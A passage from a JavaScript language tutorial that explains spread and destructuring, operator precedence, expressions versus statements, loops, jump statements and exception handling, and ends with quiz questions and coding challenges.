let obj3 = { ...obj, z: 3 };   // { x: 1, y: 2, z: 3 }

// Merge objects
let merged = { ...obj1, ...obj2 };

// Override properties
let updated = { ...obj, x: 10 }; // { x: 10, y: 2 }
```

**Strings:**

```javascript
let str = "hello";
let chars = [...str];  // ["h", "e", "l", "l", "o"]
```

**Sets and Maps:**

```javascript
let set = new Set([1, 2, 3]);
let arr = [...set];  // [1, 2, 3]

let map = new Map([["a", 1], ["b", 2]]);
let arr = [...map];  // [["a", 1], ["b", 2]]
```

---

### Destructuring

**Arrays:**

```javascript
let [a, b, c] = [1, 2, 3];
console.log(a, b, c);  // 1 2 3

// Skip elements
let [x, , z] = [1, 2, 3];  // x=1, z=3

// Rest
let [first, ...rest] = [1, 2, 3, 4];  // first=1, rest=[2,3,4]

// Default values
let [a = 0, b = 0] = [1];  // a=1, b=0

// Swap
let x = 1, y = 2;
[x, y] = [y, x];  // x=2, y=1
```

**Objects:**

```javascript
let { x, y } = { x: 1, y: 2 };
console.log(x, y);  // 1 2

// Rename
let { x: a, y: b } = { x: 1, y: 2 };  // a=1, b=2

// Default values
let { x = 0, y = 0 } = { x: 1 };  // x=1, y=0

// Nested
let { profile: { name } } = { profile: { name: "Alice" } };

// Rest
let { x, ...rest } = { x: 1, y: 2, z: 3 };  // x=1, rest={y:2, z:3}
```

**Function parameters:**

```javascript
function greet({ name, age }) {
  console.log(`${name} is ${age}`);
}

greet({ name: "Alice", age: 30 });  // "Alice is 30"

// With defaults
function greet({ name = "Guest", age = 0 } = {}) {
  console.log(`${name} is ${age}`);
}
```

---

### 1.5.10 Operator Precedence

Precedence determines evaluation order (higher = evaluated first):

|Precedence|Operator|Description|
|---|---|---|
|21|`()`, `[]`, `.`|Grouping, member access|
|20|`new` (with args)|Constructor|
|19|`()`|Function call|
|19|`new` (no args)|Constructor|
|18|`?.`|Optional chaining|
|17|`++`, `--` (postfix)|Increment/decrement|
|16|`!`, `~`, `+`, `-`, `typeof`, `void`, `delete`, `++`, `--` (prefix)|Unary|
|15|`**`|Exponentiation|
|14|`*`, `/`, `%`|Multiplication/division|
|13|`+`, `-`|Addition/subtraction|
|12|`<<`, `>>`, `>>>`|Bitwise shift|
|11|`<`, `<=`, `>`, `>=`, `in`, `instanceof`|Relational|
|10|`==`, `!=`, `===`, `!==`|Equality|
|9|`&`|Bitwise AND|
|8|`^`|Bitwise XOR|
|7|`\|`|Bitwise OR|
|6|`&&`|Logical AND|
|5|`\|`|Logical OR|
|4|`??`|Nullish coalescing|
|3|`? :`|Conditional (ternary)|
|2|`=`, `+=`, `-=`, etc.|Assignment|
|1|`,`|Comma|

**Examples:**

```javascript
// Precedence
2 + 3 * 4;         // 14 (3 * 4 first)
2 ** 3 ** 2;       // 512 (right-associative: 2 ** (3 ** 2))
a && b || c;       // (a && b) || c
a || b && c;       // a || (b && c)

// Parentheses override
(2 + 3) * 4;       // 20
```

---

### Associativity

**Left-to-right:**

```javascript
a - b - c;         // (a - b) - c
a / b / c;         // (a / b) / c
```

**Right-to-left:**

```javascript
a = b = c;         // a = (b = c)
a ** b ** c;       // a ** (b ** c)
```

---

### 1.5.11 Summary

### Operator Categories

**Arithmetic:**

- `+`, `-`, `*`, `/`, `%`, `**`
- Unary: `+`, `-`, `++`, `--`
- Numeric coercion (except `+` with strings)

**Assignment:**

- `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`
- Logical: `&&=`, `||=`, `??=` (ES2021)

**Comparison:**

- Equality: `==`, `===`, `!=`, `!==`
- Relational: `<`, `>`, `<=`, `>=`

**Logical:**

- `&&`, `||`, `!`
- Short-circuit evaluation
- Return operands (not just true/false)

**Bitwise:**

- `&`, `|`, `^`, `~`
- `<<`, `>>`, `>>>`
- Operate on 32-bit integers

**Special:**

- Ternary: `? :`
- Optional chaining: `?.`
- Nullish coalescing: `??`
- `typeof`, `instanceof`, `in`, `delete`, `void`
- Comma: `,`
- Spread: `...`
- Destructuring

---

### Key Takeaways

1. **`+` is overloaded**: Addition for numbers, concatenation for strings
2. **Other arithmetic operators coerce to number**
3. **`&&` and `||` return operands**, not booleans
4. **`??` vs `||`**: Nullish vs falsy
5. **`?.` safely accesses nested properties**
6. **Logical assignment short-circuits**: `&&=`, `||=`, `??=`
7. **Bitwise operators work on 32-bit integers**
8. **Precedence matters**: Use parentheses for clarity
9. **Assignment is right-associative**
10. **Spread and destructuring enable concise code**

---

## 1.6 Expressions and Statements

### 1.6.1 Expressions vs Statements

### Definitions

**Expression:**

- Produces a value
- Can be used anywhere a value is expected
- Examples: `5`, `x + 2`, `func()`, `a ? b : c`

**Statement:**

- Performs an action
- Cannot be used as a value
- Examples: `if`, `for`, `while`, `let x = 5;`

---

### Key Differences

```javascript
// Expression: produces value
5 + 3;              // Evaluates to 8
x = 10;             // Evaluates to 10 (and assigns)
user.getName();     // Evaluates to return value

// Statement: performs action
let x = 5;          // Declares variable (no value produced)
if (x > 0) { }      // Controls flow (no value)
while (true) { }    // Loop (no value)

// Expression statement: expression used as statement
5 + 3;              // Valid (but useless)
console.log("hi");  // Expression used as statement
```

**Where expressions can be used:**

```javascript
// Anywhere a value is expected
let x = 5 + 3;           // Right side of assignment
console.log(5 + 3);      // Function argument
arr[5 + 3];              // Array index
obj[5 + 3];              // Property access
(5 + 3) + 2;             // Part of larger expression
return 5 + 3;            // Return value
```

**Where statements can be used:**

```javascript
// At statement position
if (x > 0) { }           // Control flow
for (let i = 0; i < 10; i++) { }  // Loop
let x = 5;               // Declaration
```

---

### Expression Statements

Any expression can be used as a statement (though often pointless):

```javascript
// Valid expression statements
5;                  // Evaluates to 5 (discarded)
"hello";            // Evaluates to "hello" (discarded)
x + y;              // Evaluates (result discarded)
func();             // Calls function (side effects may occur)

// Common expression statements
console.log("hi");  // Function call
x = 5;              // Assignment
x++;                // Increment
arr.push(5);        // Method call
```

---

### 1.6.2 Primary Expressions

Primary expressions are the simplest expressionsâ€”literals and identifiers.

### Literals

**Primitive literals:**

```javascript
// Number
42
3.14
0xFF
0b1010
0o77
1e5
123n  // BigInt

// String
"hello"
'world'
`template`

// Boolean
true
false

// Null and undefined
null
undefined

// Regular expression
/pattern/flags
```

**Object literals:**

```javascript
{}
{ x: 1, y: 2 }
{ name: "Alice", age: 30 }

// Computed property names
{ [key]: value }
{ ["prop" + 1]: "value" }

// Method shorthand
{ method() { } }

// Getter/setter
{ get prop() { }, set prop(value) { } }
```

**Array literals:**

```javascript
[]
[1, 2, 3]
[1, , 3]  // Sparse (hole at index 1)
[...arr]  // Spread
```

**Function literals:**

```javascript
function() { }
function(x) { return x * 2; }
function name(x) { return x * 2; }

// Arrow functions
() => { }
x => x * 2
(x, y) => x + y
```

**Class literals:**

```javascript
class { }
class MyClass { }
class extends Parent { }
```

**Template literals:**

```javascript
`hello`
`hello ${name}`
`multi
line
string`

// Tagged template
tag`template`
```

---

### Identifiers

Variable, function, and property names:

```javascript
x
userName
_private
$jquery
Symbol.iterator
```

---

### Reserved Words as Property Names

**Allowed in object literals and member access:**

```javascript
let obj = {
  if: 1,
  while: 2,
  class: 3,
  return: 4
};

console.log(obj.if);      // 1
console.log(obj["if"]);   // 1

// But not as identifiers
let if = 5;  // SyntaxError
```

---

### 1.6.3 Left-Hand-Side Expressions

Expressions that can appear on the left side of an assignment.

### Property Access

**Dot notation:**

```javascript
obj.property
obj.method()
arr.length
```

**Bracket notation:**

```javascript
obj[property]
obj["property"]
arr[0]
arr[index]
obj[dynamicKey]
```

**Computed property access:**

```javascript
obj[key]
obj["prop" + suffix]
obj[func()]
```

---

### Function Calls

**Regular calls:**

```javascript
func()
func(arg1, arg2)
obj.method()
obj.method(arg1, arg2)
```

**Constructor calls:**

```javascript
new Constructor()
new Constructor(arg1, arg2)
new Date()
new Array(5)
```

**Optional chaining in calls:**

```javascript
func?.()              // Call if func is not nullish
obj.method?.()        // Call if method is not nullish
obj?.method()         // Access method if obj is not nullish
```

---

### `new` Expression

**With arguments:**

```javascript
new Constructor(arg1, arg2)
new Date()
new Array(5)
new Map()
```

**Without arguments:**

```javascript
new Constructor
new Date
new Array  // Same as new Array()
```

**Precedence matters:**

```javascript
new Constructor().method();    // (new Constructor()).method()
new Constructor.staticMethod(); // new (Constructor.staticMethod)()
```

---

### `super` Expression

**In class methods:**

```javascript
class Child extends Parent {
  constructor() {
    super();          // Call parent constructor
  }
  
  method() {
    super.method();   // Call parent method
  }
}
```

**In object literals:**

```javascript
let obj = {
  method() {
    super.method();  // Call method from prototype
  }
};
```

---

### `this` Expression

```javascript
this.property
this.method()

function f() {
  console.log(this);  // Depends on how f is called
}

// Method call
obj.f();  // this = obj

// Regular call
f();      // this = globalThis (sloppy) or undefined (strict)

// Constructor call
new f();  // this = new object

// Explicit binding
f.call(obj);   // this = obj
f.apply(obj);  // this = obj
f.bind(obj)(); // this = obj

// Arrow functions (lexical this)
const arrow = () => console.log(this);
```

---

### Import and Import.meta

**Import (static):**

```javascript
import { name } from "./module.js";
import * as ns from "./module.js";
import defaultExport from "./module.js";
```

**Dynamic import (expression):**

```javascript
import("./module.js").then(module => {
  // Use module
});

// In async function
const module = await import("./module.js");
```

**Import.meta:**

```javascript
import.meta.url;  // Current module URL
```

---

### 1.6.4 Expression Composition

### Binary Expressions

Operators with two operands:

```javascript
// Arithmetic
a + b
a - b
a * b
a / b
a % b
a ** b

// Comparison
a < b
a > b
a <= b
a >= b
a == b
a === b
a != b
a !== b

// Logical
a && b
a || b
a ?? b

// Bitwise
a & b
a | b
a ^ b
a << b
a >> b
a >>> b

// Relational
a in obj
a instanceof Constructor
```

---

### Unary Expressions

Operators with one operand:

```javascript
+x        // Numeric conversion
-x        // Negation
!x        // Logical NOT
~x        // Bitwise NOT
typeof x  // Type check
void x    // Returns undefined
delete x  // Delete property
++x       // Pre-increment
--x       // Pre-decrement
x++       // Post-increment
x--       // Post-decrement
await x   // Await promise (async context)
```

---

### Ternary Expression

Conditional operator (only ternary operator):

```javascript
condition ? trueValue : falseValue

x > 0 ? "positive" : "negative"

// Nested
x > 0 ? "positive" :
x < 0 ? "negative" : "zero"
```

---

### Comma Expression

Evaluates multiple expressions, returns last:

```javascript
(a, b, c)     // Evaluates a, b, c; returns c
(x++, y++, z++)  // Increments all; returns z++

// In for loop
for (i = 0, j = 10; i < j; i++, j--) { }
```

---

### Grouping Expression

Parentheses control evaluation order:

```javascript
(expression)

(2 + 3) * 4    // 20 (vs 2 + 3 * 4 = 14)
(a, b, c)      // Comma expression
(function() {})()  // IIFE
```

---

### 1.6.5 Declaration Statements

### Variable Declarations

**`var` declarations:**

```javascript
var x;
var y = 10;
var a, b, c;
var m = 1, n = 2;
```

**`let` declarations:**

```javascript
let x;
let y = 10;
let a, b, c;
let m = 1, n = 2;

// Block-scoped
{
  let blockVar = 5;
}
// blockVar not accessible here
```

**`const` declarations:**

```javascript
const PI = 3.14159;
const obj = { x: 1 };

// Must be initialized
const x;  // SyntaxError

// Cannot reassign
const y = 5;
y = 10;  // TypeError
```

---

### Function Declarations

**Named function:**

```javascript
function name(params) {
  // Body
}

function add(a, b) {
  return a + b;
}
```

**Generator function:**

```javascript
function* gen() {
  yield 1;
  yield 2;
}

const g = gen();
g.next();  // { value: 1, done: false }
```

**Async function:**

```javascript
async function fetchData() {
  const response = await fetch(url);
  return response.json();
}
```

**Async generator:**

```javascript
async function* asyncGen() {
  yield await promise1;
  yield await promise2;
}
```

---

### Class Declarations

**Basic class:**

```javascript
class MyClass {
  constructor(x) {
    this.x = x;
  }
  
  method() {
    return this.x;
  }
}
```

**Class with inheritance:**

```javascript
class Child extends Parent {
  constructor(x, y) {
    super(x);
    this.y = y;
  }
  
  method() {
    return super.method() + this.y;
  }
}
```

---

### Import/Export Declarations

**Export:**

```javascript
export const value = 42;
export function func() { }
export class MyClass { }

export { name1, name2 };
export { name1 as alias };

export default value;
export default function() { }
export default class { }
```

**Import:**

```javascript
import { name } from "./module.js";
import { name as alias } from "./module.js";
import * as ns from "./module.js";
import defaultExport from "./module.js";
import defaultExport, { name } from "./module.js";
```

---

### 1.6.6 Control Flow Statements

### `if` Statement

**Basic:**

```javascript
if (condition) {
  // Execute if true
}

if (x > 0) {
  console.log("positive");
}
```

**With `else`:**

```javascript
if (condition) {
  // Execute if true
} else {
  // Execute if false
}

if (x > 0) {
  console.log("positive");
} else {
  console.log("not positive");
}
```

**With `else if`:**

```javascript
if (condition1) {
  // Execute if condition1 is true
} else if (condition2) {
  // Execute if condition2 is true
} else {
  // Execute if all false
}

if (x > 0) {
  console.log("positive");
} else if (x < 0) {
  console.log("negative");
} else {
  console.log("zero");
}
```

**Without braces (single statement):**

```javascript
if (x > 0) console.log("positive");

if (x > 0)
  console.log("positive");
else
  console.log("not positive");

// Dangling else problem
if (x > 0)
  if (y > 0)
    console.log("both positive");
else  // Binds to inner if!
  console.log("x positive, y not");

// Use braces for clarity
if (x > 0) {
  if (y > 0) {
    console.log("both positive");
  }
} else {
  console.log("x not positive");
}
```

---

### `switch` Statement

**Basic:**

```javascript
switch (expression) {
  case value1:
    // Execute if expression === value1
    break;
  case value2:
    // Execute if expression === value2
    break;
  default:
    // Execute if no case matches
}
```

**Example:**

```javascript
switch (day) {
  case 0:
    console.log("Sunday");
    break;
  case 1:
    console.log("Monday");
    break;
  case 2:
    console.log("Tuesday");
    break;
  // ...
  default:
    console.log("Unknown day");
}
```

**Fall-through (intentional):**

```javascript
switch (month) {
  case 1:
  case 3:
  case 5:
  case 7:
  case 8:
  case 10:
  case 12:
    console.log("31 days");
    break;
  case 4:
  case 6:
  case 9:
  case 11:
    console.log("30 days");
    break;
  case 2:
    console.log("28 or 29 days");
    break;
}
```

**Block scope in cases:**

```javascript
switch (value) {
  case 1: {
    let x = 10;
    console.log(x);
    break;
  }
  case 2: {
    let x = 20;  // Different scope, no conflict
    console.log(x);
    break;
  }
}
```

**Without `break` (fall-through bug):**

```javascript
switch (x) {
  case 1:
    console.log("one");
    // Falls through!
  case 2:
    console.log("two");
    // Falls through!
  case 3:
    console.log("three");
}

// If x = 1, logs: "one", "two", "three"
```

**Using expressions in cases:**

```javascript
switch (true) {
  case x > 0:
    console.log("positive");
    break;
  case x < 0:
    console.log("negative");
    break;
  default:
    console.log("zero");
}
```

---

### 1.6.7 Loop Statements

### `while` Loop

**Syntax:**

```javascript
while (condition) {
  // Execute while condition is true
}
```

**Example:**

```javascript
let i = 0;
while (i < 5) {
  console.log(i);
  i++;
}
// 0, 1, 2, 3, 4
```

**Infinite loop:**

```javascript
while (true) {
  // Runs forever (use break to exit)
}
```

---

### `do-while` Loop

**Syntax:**

```javascript
do {
  // Execute at least once
} while (condition);
```

**Example:**

```javascript
let i = 0;
do {
  console.log(i);
  i++;
} while (i < 5);
// 0, 1, 2, 3, 4

// Executes at least once even if condition is false
let j = 10;
do {
  console.log(j);  // Logs 10
} while (j < 5);
```

---

### `for` Loop

**Syntax:**

```javascript
for (initialization; condition; increment) {
  // Execute while condition is true
}
```

**Example:**

```javascript
for (let i = 0; i < 5; i++) {
  console.log(i);
}
// 0, 1, 2, 3, 4
```

**Parts are optional:**

```javascript
// Infinite loop
for (;;) {
  // Runs forever
}

// Initialization outside
let i = 0;
for (; i < 5; i++) {
  console.log(i);
}

// Increment inside body
for (let i = 0; i < 5;) {
  console.log(i);
  i++;
}
```

**Multiple variables:**

```javascript
for (let i = 0, j = 10; i < j; i++, j--) {
  console.log(i, j);
}
```

**`let` creates per-iteration binding:**

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 0, 1, 2 (each iteration has its own i)

// vs var (single binding)
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 3, 3, 3
```

---

### `for-in` Loop

Iterate over enumerable properties:

```javascript
for (variable in object) {
  // Execute for each property
}
```

**Example:**

```javascript
let obj = { a: 1, b: 2, c: 3 };

for (let key in obj) {
  console.log(key, obj[key]);
}
// "a" 1
// "b" 2
// "c" 3
```

**Arrays (avoid):**

```javascript
let arr = [10, 20, 30];

for (let index in arr) {
  console.log(index, arr[index]);
}
// "0" 10  (index is string!)
// "1" 20
// "2" 30

// Plus inherited properties (if any)
// Use for-of instead
```

**Inherited properties:**

```javascript
let parent = { inherited: true };
let child = Object.create(parent);
child.own = true;

for (let key in child) {
  console.log(key);
}
// "own"
// "inherited"

// Filter own properties
for (let key in child) {
  if (child.hasOwnProperty(key)) {
    console.log(key);  // Only "own"
  }
}
```

---

### `for-of` Loop

Iterate over iterable objects:

```javascript
for (variable of iterable) {
  // Execute for each value
}
```

**Arrays:**

```javascript
let arr = [10, 20, 30];

for (let value of arr) {
  console.log(value);
}
// 10, 20, 30
```

**Strings:**

```javascript
let str = "hello";

for (let char of str) {
  console.log(char);
}
// "h", "e", "l", "l", "o"

// Works with Unicode correctly
for (let char of "ðŸ˜€ðŸŽ‰") {
  console.log(char);
}
// "ðŸ˜€", "ðŸŽ‰"
```

**Sets:**

```javascript
let set = new Set([1, 2, 3]);

for (let value of set) {
  console.log(value);
}
// 1, 2, 3
```

**Maps:**

```javascript
let map = new Map([["a", 1], ["b", 2]]);

for (let [key, value] of map) {
  console.log(key, value);
}
// "a" 1
// "b" 2

// Just keys
for (let key of map.keys()) {
  console.log(key);
}

// Just values
for (let value of map.values()) {
  console.log(value);
}
```

**Custom iterables:**

```javascript
let range = {
  from: 1,
  to: 5,
  
  [Symbol.iterator]() {
    return {
      current: this.from,
      last: this.to,
      
      next() {
        if (this.current <= this.last) {
          return { value: this.current++, done: false };
        } else {
          return { done: true };
        }
      }
    };
  }
};

for (let num of range) {
  console.log(num);
}
// 1, 2, 3, 4, 5
```

**Destructuring:**

```javascript
let arr = [[1, 2], [3, 4], [5, 6]];

for (let [a, b] of arr) {
  console.log(a, b);
}
// 1 2
// 3 4
// 5 6
```

---

### `for await...of` Loop

Iterate over async iterables:

```javascript
for await (variable of asyncIterable) {
  // Execute for each value
}
```

**Example:**

```javascript
async function* asyncGen() {
  yield await Promise.resolve(1);
  yield await Promise.resolve(2);
  yield await Promise.resolve(3);
}

(async () => {
  for await (let value of asyncGen()) {
    console.log(value);
  }
})();
// 1, 2, 3 (awaits each promise)
```

---

### 1.6.8 Jump Statements

### `break` Statement

**Exit loop:**

```javascript
for (let i = 0; i < 10; i++) {
  if (i === 5) break;
  console.log(i);
}
// 0, 1, 2, 3, 4
```

**Exit switch:**

```javascript
switch (value) {
  case 1:
    console.log("one");
    break;  // Exit switch
  case 2:
    console.log("two");
    break;
}
```

**Labeled break:**

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (i === 1 && j === 1) break outer;
    console.log(i, j);
  }
}
// 0 0
// 0 1
// 0 2
// 1 0
```

**Cannot break from function:**

```javascript
function f() {
  for (let i = 0; i < 10; i++) {
    break;  // OK: breaks loop
  }
  break;  // SyntaxError: not in loop/switch
}
```

---

### `continue` Statement

**Skip to next iteration:**

```javascript
for (let i = 0; i < 5; i++) {
  if (i === 2) continue;
  console.log(i);
}
// 0, 1, 3, 4 (skips 2)
```

**In while loop:**

```javascript
let i = 0;
while (i < 5) {
  i++;
  if (i === 2) continue;
  console.log(i);
}
// 1, 3, 4, 5 (skips 2)
```

**Labeled continue:**

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (j === 1) continue outer;
    console.log(i, j);
  }
}
// 0 0
// 1 0
// 2 0
```

**Only in loops (not switch):**

```javascript
switch (value) {
  case 1:
    continue;  // SyntaxError
}
```

---

### `return` Statement

**Return value from function:**

```javascript
function add(a, b) {
  return a + b;
}

let result = add(5, 3);  // 8
```

**Return without value (returns `undefined`):**

```javascript
function log(msg) {
  console.log(msg);
  return;  // Returns undefined
}

function noReturn() {
  // Implicit: return undefined;
}
```

**Early return:**

```javascript
function processUser(user) {
  if (!user) return;  // Early exit
  
  // Process user
}
```

**Cannot return from top-level:**

```javascript
// Top-level code
return 42;  // SyntaxError (not in function)
```

**Return in arrow functions:**

```javascript
// Implicit return (single expression)
const add = (a, b) => a + b;

// Explicit return (block body)
const add = (a, b) => {
  return a + b;
};

// Returning object literal (wrap in parens)
const makeObj = () => ({ x: 1, y: 2 });
```

---

### `throw` Statement

**Throw exception:**

```javascript
throw expression;

throw new Error("Something went wrong");
throw "Error message";  // Can throw any value
throw 42;
throw { code: 500, message: "Server error" };
```

**Examples:**

```javascript
function divide(a, b) {
  if (b === 0) {
    throw new Error("Division by zero");
  }
  return a / b;
}

try {
  divide(10, 0);
} catch (error) {
  console.log(error.message);  // "Division by zero"
}
```

**Custom errors:**

```javascript
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.name = "ValidationError";
  }
}

throw new ValidationError("Invalid input");
```

---

### `try-catch-finally` Statement

**Basic try-catch:**

```javascript
try {
  // Code that might throw
  riskyOperation();
} catch (error) {
  // Handle error
  console.log(error.message);
}
```

**With finally:**

```javascript
try {
  // Code that might throw
  riskyOperation();
} catch (error) {
  // Handle error
  console.log(error.message);
} finally {
  // Always executes (even if return in try/catch)
  cleanup();
}
```

**Catch without binding (ES2019):**

```javascript
try {
  riskyOperation();
} catch {
  // Don't need error variable
  console.log("Something went wrong");
}
```

**Finally executes even with return:**

```javascript
function f() {
  try {
    return 1;
  } finally {
    console.log("finally");  // Executes before return
  }
}

f();
// Logs: "finally"
// Returns: 1
```

**Finally overrides return:**

```javascript
function f() {
  try {
    return 1;
  } finally {
    return 2;  // Overrides try's return
  }
}

f();  // Returns 2
```

**Nested try-catch:**

```javascript
try {
  try {
    throw new Error("inner");
  } catch (error) {
    console.log("inner catch:", error.message);
    throw error;  // Re-throw
  }
} catch (error) {
  console.log("outer catch:", error.message);
}
// Logs: "inner catch: inner"
// Logs: "outer catch: inner"
```

---

### 1.6.9 Other Statements

### Empty Statement

**Syntax:**

```javascript
;
```

**Use case: Empty loop body:**

```javascript
// Process in loop condition
while (processNext());

// Empty for body
for (let i = 0; i < arr.length && arr[i] !== target; i++);
```

---

### Block Statement

**Syntax:**

```javascript
{
  // Statements
}
```

**Creates block scope for `let` and `const`:**

```javascript
{
  let x = 10;
  const y = 20;
}
// x and y not accessible here
```

**Multiple statements where one expected:**

```javascript
if (condition) {
  statement1;
  statement2;
  statement3;
}
```

---

### Labeled Statement

**Syntax:**

```javascript
label: statement
```

**Use with break/continue:**

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (i === 1 && j === 1) break outer;
    console.log(i, j);
  }
}
```

**Label any statement:**

```javascript
myLabel: {
  console.log("start");
  if (condition) break myLabel;
  console.log("end");
}
```

---

### `with` Statement (Deprecated)

**Syntax:**

```javascript
with (object) {
  // Statements
}
```

**Example:**

```javascript
let obj = { x: 1, y: 2 };

with (obj) {
  console.log(x);  // 1 (looks up in obj)
  console.log(y);  // 2
}
```

**Problems:**

- Performance: Prevents optimizations
- Ambiguity: Unclear variable resolution
- Confusing: Hard to understand

**Forbidden in strict mode:**

```javascript
"use strict";
with (obj) {  // SyntaxError
  // ...
}
```

**Don't use `with`. Use destructuring instead:**

```javascript
let { x, y } = obj;
console.log(x, y);
```

---

### `debugger` Statement

**Syntax:**

```javascript
debugger;
```

**Effect:**

Pauses execution in debugger (if open):

```javascript
function buggyFunction() {
  let x = 5;
  debugger;  // Execution pauses here
  console.log(x);
}
```

**No effect if debugger not open.**

---

### 1.6.10 Expression vs Statement Contexts

### Where Statements Expected

**Top-level (module/script):**

```javascript
let x = 5;
function f() { }
class MyClass { }
if (x > 0) { }
```

**Function body:**

```javascript
function f() {
  let x = 5;
  if (x > 0) { }
  return x;
}
```

**Block body:**

```javascript
{
  let x = 5;
  console.log(x);
}
```

**Control flow bodies:**

```javascript
if (condition) {
  statements;
}

for (init; test; incr) {
  statements;
}

while (condition) {
  statements;
}
```

---

### Where Expressions Expected

**Assignment right-hand side:**

```javascript
let x = expression;
```

**Function arguments:**

```javascript
func(expression);
```

**Array elements:**

```javascript
[expression1, expression2];
```

**Object property values:**

```javascript
{ key: expression };
```

**Return value:**

```javascript
return expression;
```

**Conditional:**

```javascript
expression ? a : b;
```

---

### Ambiguous Constructs

**Object literal vs block:**

```javascript
// Block (statement context)
{ x: 1 }  // Label x, expression statement 1

// Object literal (expression context)
({ x: 1 })  // Object { x: 1 }
```

**Function declaration vs expression:**

```javascript
// Declaration (statement context)
function f() { }

// Expression (expression context)
(function f() { })
(function() { })  // Anonymous
```

**Class declaration vs expression:**

```javascript
// Declaration (statement context)
class MyClass { }

// Expression (expression context)
(class MyClass { })
(class { })  // Anonymous
```

---

### 1.6.11 Summary

### Expression Types

**Primary:**

- Literals: `42`, `"hello"`, `true`, `null`, `[]`, `{}`
- Identifiers: `x`, `userName`
- Keywords: `this`, `super`

**Left-hand-side:**

- Property access: `obj.prop`, `arr[0]`
- Calls: `func()`, `new Constructor()`
- Optional chaining: `obj?.prop`

**Operators:**

- Arithmetic: `a + b`, `a * b`
- Comparison: `a < b`, `a === b`
- Logical: `a && b`, `a || b`
- Ternary: `a ? b : c`

---

### Statement Types

**Declarations:**

- `let`, `const`, `var`
- `function`, `class`
- `import`, `export`

**Control flow:**

- `if`, `else`
- `switch`, `case`
- Loops: `for`, `while`, `do-while`, `for-in`, `for-of`

**Jump:**

- `break`, `continue`
- `return`, `throw`

**Exception handling:**

- `try`, `catch`, `finally`

**Other:**

- Block: `{ }`
- Empty: `;`
- Label: `label:`
- `with` (deprecated)
- `debugger`

---

### Key Takeaways

1. **Expressions produce values**, statements perform actions
2. **Expression statements** are valid but often useless
3. **Left-hand-side expressions** can be assigned to
4. **`let` in for loops** creates per-iteration binding
5. **`for-in` iterates properties** (use for objects)
6. **`for-of` iterates values** (use for arrays/iterables)
7. **`break` exits loops/switch**, `continue` skips iteration
8. **`return` exits function**, `throw` raises exception
9. **`finally` always executes**, even with return/throw
10. **Context determines** if `{ }` is block or object literal

---
## 1.7 Language Fundamentals Summary

### Core Concepts

| Section | Key Topics |
|---------|------------|
| **1.1 Lexical Structure** | Tokens, keywords, identifiers, literals, ASI, Unicode, strict mode |
| **1.2 Variables** | `var`/`let`/`const`, hoisting, TDZ, block vs function scope, `globalThis` |
| **1.3 Data Types** | 7 primitives, reference types, value vs reference semantics, IEEE 754, Symbol, WeakMap/WeakSet |
| **1.4 Type System** | `typeof`, `instanceof`, coercion, explicit conversion, truthy/falsy, `===`/`==`/`Object.is()` |
| **1.5 Operators** | Arithmetic, assignment, comparison, logical, bitwise, `?.`, `??`, `&&=`/`||=`/`??=`, precedence |
| **1.6 Expressions & Statements** | Primary/LHS expressions, control flow, loops, jump statements, try-catch-finally |

### Essential Rules

1. **Use `const` by default**, `let` when reassignment needed, never `var`
2. **Prefer `===` over `==`** â€” use `==` only for `null`/`undefined` checks
3. **Understand coercion** â€” `+` concatenates strings, other operators coerce to number
4. **TDZ protects you** â€” `let`/`const` prevent use-before-declaration bugs
5. **`for-of` for values, `for-in` for properties** â€” don't use `for-in` on arrays
6. **`?.` and `??` for safety** â€” optional chaining and nullish coalescing prevent crashes
7. **Strict mode always** â€” ES6 modules and classes enable it automatically
8. **Primitives are immutable** â€” `const obj = {}` allows mutation, `const x = 5` doesn't

---

## Mastery Check

Test your understanding with these challenges. Try to answer without running the code.

### Quiz Questions

**Q1:** What does this output?
```javascript
console.log(typeof null);
console.log(typeof []);
console.log(typeof function(){});
```

<details>
<summary>Answer</summary>

```
"object"     // Historical bug in JavaScript
"object"     // Arrays are objects
"function"   // Functions get special treatment
```
</details>

**Q2:** What's the output and why?
```javascript
let x = 1;
{
  console.log(x);
  let x = 2;
}
```

<details>
<summary>Answer</summary>

ReferenceError: Cannot access 'x' before initialization.

The inner `let x` creates a new binding for the entire block (hoisting), but accessing it before the declaration triggers the Temporal Dead Zone error.
</details>

**Q3:** Predict the output:
```javascript
console.log(0.1 + 0.2 === 0.3);
console.log(0.1 + 0.2);
console.log(Number.EPSILON > Math.abs(0.1 + 0.2 - 0.3));
```

<details>
<summary>Answer</summary>

```javascript
false               // IEEE 754 floating point imprecision
0.30000000000000004 // The actual result
true                // Using EPSILON for safe comparison
```
</details>

**Q4:** What's the result?
```javascript
const result = [] + [];
const result2 = [] + {};
const result3 = {} + [];
```

<details>
<summary>Answer</summary>

```javascript
""           // Both arrays coerce to "", "" + "" = ""
"[object Object]"  // [] â†’ "", {} â†’ "[object Object]"
0            // {} is parsed as empty block, +[] â†’ 0
             // (In expression context: "[object Object]")
```
</details>

**Q5:** Fix this code so it works correctly:
```javascript
const config = {
  api: {
    // url might be undefined
  }
};
const url = config.api.url || 'default';  // Problem with empty string
```

<details>
<summary>Answer</summary>

```javascript
// Use nullish coalescing instead of ||
const url = config.api.url ?? 'default';

// ?? only falls back for null/undefined, not empty string or 0
```
</details>

### Coding Challenges

**Challenge 1:** Write a function that checks if two floating-point numbers are "close enough" to be considered equal.

<details>
<summary>Solution</summary>

```javascript
function approximatelyEqual(a, b, epsilon = Number.EPSILON) {
  return Math.abs(a - b) < epsilon;
}

// Or for larger tolerances:
function approximatelyEqual(a, b, tolerance = 1e-10) {
  return Math.abs(a - b) < tolerance;
}
```
</details>

**Challenge 2:** Without using `typeof`, write a function that returns the actual type of any value (distinguishing null, array, object, etc.).

<details>
<summary>Solution</summary>

```javascript
function realType(value) {
  if (value === null) return 'null';
  if (Array.isArray(value)) return 'array';
  return typeof value;
}

// Or using Object.prototype.toString for all types:
function realType(value) {
  return Object.prototype.toString.call(value)
    .slice(8, -1)
    .toLowerCase();
}
// Returns: 'null', 'array', 'object', 'date', 'regexp', 'map', etc.
```
</details>

**Challenge 3:** Explain what happens at each step:
```javascript
let a = 5;
let b = a;
a = 10;
console.log(b);  // ?

let obj1 = { x: 5 };
